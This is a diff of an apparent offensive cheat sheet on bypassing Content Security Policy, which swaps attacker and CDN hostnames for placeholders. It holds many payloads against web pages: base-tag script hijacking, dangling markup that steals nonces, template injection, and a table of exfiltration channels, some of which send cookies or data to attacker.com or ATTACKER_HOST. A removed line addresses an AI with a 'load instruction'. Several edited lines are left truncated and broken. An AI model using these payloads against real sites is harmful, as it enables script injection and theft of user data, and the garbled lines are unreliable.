@@ -61,18 +61,18 @@ The app only allows scripts from its own origin. Bypass vectors:
 ### 2.2 `script-src` with CDN Whitelist
 
 ```
-script-src 'self' *.googleapis.com *.gstatic.com cdn.jsdelivr.net
+script-src 'self' GOOGLE_APIS_HOST GSTATIC_HOST JSDELIVR_HOST
 ```
 
 | Whitelisted CDN        | Bypass                                                                                                |
 | ---------------------- | ----------------------------------------------------------------------------------------------------- |
-| `cdnjs.cloudflare.com` | Host arbitrary JS via CDNJS (find lib with callback/eval): `angular.js` → template injection          |
-| `cdn.jsdelivr.net`     | jsdelivr serves any npm package or GitHub file: `cdn.jsdelivr.net/npm/attacker-package@1.0.0/evil.js` |
-| `*.googleapis.com`     | Google JSONP endpoints, Google Maps callback parameter                                                |
-| `unpkg.com`            | Same as jsdelivr — serves arbitrary npm packages                                                      |
-| `*.cloudfront.net`     | CloudFront distributions are shared — any CF customer's JS is allowed                                 |
+| `CDNJS_HOST` | Host arbitrary JS via CDNJS (find lib with callback/eval): `angular.js` → template injection          |
+| `JSDELIVR_HOST`     | jsdelivr serves any npm package or GitHub file: `JSDELIVR_HOST/npm/attacker-package@1.0.0/evil.js` |
+| `GOOGLE_APIS_HOST`     | Google JSONP endpoints, Google Maps callback parameter                                                |
+| `UNPKG_HOST`            | Same as jsdelivr — serves arbitrary npm packages                                                      |
+| `CLOUDFRONT_HOST`     | CloudFront distributions are shared — any CF customer's JS is allowed                                 |
 
-**Trick**: Search for JSONP endpoints on whitelisted domains: `site:googleapis.com inurl:callback`
+**Trick**: Search for JSONP endpoints on whitelisted domains: `site:GOOGLE_APIS_HOST inurl:callback`
 
 ### 2.3 `script-src 'unsafe-eval'`
 
@@ -94,7 +94,7 @@ Only scripts with matching nonce attribute execute.
 | ------------------------------ | ------------------------------------------------------------------------------------------------------------------- |
 | Nonce reuse                    | Server uses same nonce across requests or for all users → predictable                                               |
 | Nonce injection via CRLF       | CRLF in response header → inject new CSP header with known nonce, or inject `<script nonce="known">`                |
-| Dangling markup to steal nonce | `<img src="https://attacker.com/steal?` (unclosed) → page content including nonce leaks as URL parameter            |
+| Dangling markup to steal nonce | `<img src=" (unclosed) → page content including nonce leaks as URL parameter            |
 | DOM clobbering                 | Overwrite nonce-checking code via DOM clobbering: `<form id="nonce"><input id="nonce" value="attacker-controlled">` |
 | Script gadgets                 | Trusted nonced script uses DOM data to create new script elements — inject that DOM data                            |
 
@@ -104,7 +104,7 @@ Trust propagation: any script created by an already-trusted script is also trust
 
 | Bypass                        | Technique                                                                                                                                                                           |
 | ----------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
-| `base-uri` injection          | `<base href="https://attacker.com/">` → relative script `src` resolves to attacker domain. Trusted parent script loads `./lib.js` which now points to `https://attacker.com/lib.js` |
+| `base-uri` injection          | `<base href=" → relative script `src` resolves to attacker domain. Trusted parent script loads `./lib.js` which now points to ` |
 | Script gadget in trusted code | Find trusted script that does `document.createElement('script'); s.src = location.hash.slice(1)` → control via URL fragment                                                         |
 | DOM XSS in trusted script     | Trusted script reads `innerHTML` from user-controlled source → injected `<script>` is trusted via `strict-dynamic`                                                                  |
 
@@ -125,7 +125,7 @@ Trust propagation: any script created by an already-trusted script is also trust
 ```html
 <!-- Vue 2 with runtime compiler -->
 <div id="app">{{_c.constructor('alert(1)')()}}</div>
-<script src="https://whitelisted-cdn/vue.js"></script>
+<script src="ALLOWED_CDN/vue.js"></script>
 <script>
   new Vue({ el: "#app" });
 </script>
@@ -138,7 +138,7 @@ If `object-src` is not set (falls back to `default-src`), and `default-src` allo
 ```html
 <!-- Flash-based bypass (legacy, mostly patched, but still appears on old systems) -->
 <object
-  data="https://attacker.com/evil.swf"
+  data="ATTACKER_ORIGIN/evil.swf"
   type="application/x-shockwave-flash"
 >
   <param name="AllowScriptAccess" value="always" />
@@ -152,10 +152,10 @@ If `object-src` is not set (falls back to `default-src`), and `default-src` allo
 
 ```html
 <!-- Inject base tag → all relative URLs resolve to attacker -->
-<base href="https://attacker.com/" />
+<base href="ATTACKER_ORIGIN/" />
 
 <!-- Existing script: <script src="/js/app.js"> -->
-<!-- Now loads: https://attacker.com/js/app.js -->
+<!-- Now loads: ATTACKER_ORIGIN/js/app.js -->
 ```
 
 This bypasses `'nonce-xxx'`, `'strict-dynamic'`, and `script-src 'self'` for relative script paths.
@@ -190,14 +190,14 @@ When `connect-src`, `img-src`, etc. are locked down, alternative exfiltration ch
 
 | Channel               | CSP Directive Needed to Block  | Technique                                                             |
 | --------------------- | ------------------------------ | --------------------------------------------------------------------- |
-| DNS prefetch          | None (CSP cannot block DNS)    | `<link rel="dns-prefetch" href="//data.attacker.com">`                |
-| WebRTC                | None (CSP cannot block)        | `new RTCPeerConnection({iceServers:[{urls:'stun:attacker.com'}]})`    |
+| DNS prefetch          | None (CSP cannot block DNS)    | `<link rel="dns-prefetch" href="//data.ATTACKER_HOST">`                |
+| WebRTC                | None (CSP cannot block)        | `new RTCPeerConnection({iceServers:[{urls:'stun:ATTACKER_HOST'}]})`    |
 | `<link rel=prefetch>` | `default-src` or `connect-src` | Often missed in CSP                                                   |
-| Redirect-based        | `navigate-to` (rarely set)     | `location='https://attacker.com/?'+document.cookie`                   |
-| CSS injection         | `style-src`                    | `<style>body{background:url(https://attacker.com/?data)}</style>`     |
-| `<a ping>`            | `connect-src`                  | `<a ping="https://attacker.com/collect" href="#">click</a>`           |
+| Redirect-based        | `navigate-to` (rarely set)     | `location='                   |
+| CSS injection         | `style-src`                    | `<style>body{background:url(     |
+| `<a ping>`            | `connect-src`                  | `<a ping=" href="#">click</a>`           |
 | `report-uri` leak     | N/A                            | Trigger CSP violation → report contains blocked-uri with data         |
-| Form submission       | `form-action`                  | `<form action="https://attacker.com/"><button>Submit</button></form>` |
+| Form submission       | `form-action`                  | `<form action=" |
 
 **DNS-based exfiltration is nearly impossible to block with CSP** — this is the most reliable channel.
 
@@ -216,7 +216,7 @@ CSP present?
 │   └── No CSP header at all on some pages? → Find CSP-free page
 │
 ├── Check missing directives
-│   ├── No base-uri? → <base href="https://attacker.com/"> → hijack relative scripts
+│   ├── No base-uri? → <base href="ATTACKER_ORIGIN/"> → hijack relative scripts
 │   ├── No object-src? → Flash/plugin-based bypass (legacy)
 │   ├── No form-action? → Exfil via form submission
 │   ├── No frame-ancestors? → Clickjacking possible
@@ -231,7 +231,7 @@ CSP present?
 ├── script-src with CDN whitelist?
 │   ├── Check CDN for JSONP endpoints
 │   ├── Check jsdelivr/unpkg/cdnjs → load attacker-controlled package
-│   └── Check *.cloudfront.net → shared distribution namespace
+│   └── Check CLOUDFRONT_HOST → shared distribution namespace
 │
 ├── script-src 'nonce-xxx'?
 │   ├── Nonce reused across requests? → Replay
@@ -307,12 +307,12 @@ AI LOAD INSTRUCTION: Master per-directive bypasses, nonce/hash abuse, strict-dyn
 - Path confusion / Relative Path Overwrite (RPO): `/user-content/;/legit.js`
 
   2.2 script-src with CDN / Host Whitelists
-  Common whitelists: `*.googleapis.com *.gstatic.com cdn.jsdelivr.net unpkg.com *.cloudfront.net`
+  Common whitelists: `GOOGLE_APIS_HOST GSTATIC_HOST JSDELIVR_HOST UNPKG_HOST CLOUDFRONT_HOST`
 
 - jsdelivr / unpkg: Load arbitrary npm/GitHub packages
-- JSONP on Google domains (`accounts.google.com/o/oauth2/revoke?callback=...`)
+- JSONP on Google domains (`GOOGLE_ACCOUNTS_HOST/o/oauth2/revoke?callback=...`)
 - Shared CloudFront distributions
-- Search: `site:whitelisted-domain.com inurl:callback`
+- Search: `site:ALLOWED_HOST inurl:callback`
 
   2.3 script-src 'unsafe-eval'
 
@@ -334,7 +334,7 @@ setTimeout("alert(1)", 0);
   2.5 script-src 'strict-dynamic'
   Trust propagates from nonce/hash-trusted scripts.
 
-- Missing `base-uri`: `<base href="https://attacker.com/">` → hijack relative `<script src="/js/app.js">`
+- Missing `base-uri`: `<base href=" → hijack relative `<script src="/js/app.js">`
 - DOM XSS in trusted script → injected `<script>` inherits trust
 - Script gadgets: `document.createElement('script'); s.src = location.hash...` or `s.textContent = ...`
 
@@ -360,7 +360,7 @@ setTimeout("alert(1)", 0);
   2.8 Missing base-uri (High Impact)
 
 ```html
-<base href="https://attacker.com/" />
+<base href="ATTACKER_ORIGIN/" />
 ```
 
 Hijacks all relative script/style/iframe sources. Works against nonce + strict-dynamic.
